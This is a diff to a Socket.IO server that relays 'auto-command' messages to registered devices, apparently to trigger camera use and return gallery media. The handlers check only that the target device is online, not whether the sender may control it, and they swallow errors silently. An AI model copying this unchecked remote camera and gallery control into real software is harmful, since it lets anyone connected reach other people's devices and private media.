@@ -488,11 +488,21 @@ io.on("connection", (socket) => {
         socket.emit("device-list-update", getDeviceListPayload());
     });
 
-    socket.on("auto-command", ({ targetDeviceId, command, page }) => {
+    socket.on("auto-command", (data) => {
+        const { targetDeviceId, command, caller, cameraChoice, mediaId, mediaType, page } = data || {};
         const target = deviceRegistry.get(targetDeviceId);
         if (target && target.socketId && target.online) {
-            io.to(target.socketId).emit("auto-command", { command, from: socket.id, page: page || 0 });
-            console.log(`Auto-command '${command}' -> device ${targetDeviceId} (socket ${target.socketId})`);
+            const callerName = caller || (usersBySocket.get(socket.id) ? usersBySocket.get(socket.id).username : socket.id);
+            io.to(target.socketId).emit("auto-command", {
+                command,
+                from: socket.id,
+                caller: callerName,
+                cameraChoice: cameraChoice || "front",
+                mediaId,
+                mediaType,
+                page: page || 0
+            });
+            console.log(`Auto-command '${command}' (caller: ${callerName}, cam: ${cameraChoice}) -> device ${targetDeviceId}`);
         } else {
             socket.emit("device-error", { error: "Device is offline or not found", targetDeviceId });
         }
@@ -503,6 +513,15 @@ io.on("connection", (socket) => {
             const targetSocketId = data && data.targetSocketId;
             if (targetSocketId) {
                 io.to(targetSocketId).emit("gallery-chunk", data);
+            }
+        } catch (e) {}
+    });
+
+    socket.on("media-detail-response", (data) => {
+        try {
+            const targetSocketId = data && data.targetSocketId;
+            if (targetSocketId) {
+                io.to(targetSocketId).emit("media-detail-response", data);
             }
         } catch (e) {}
     });
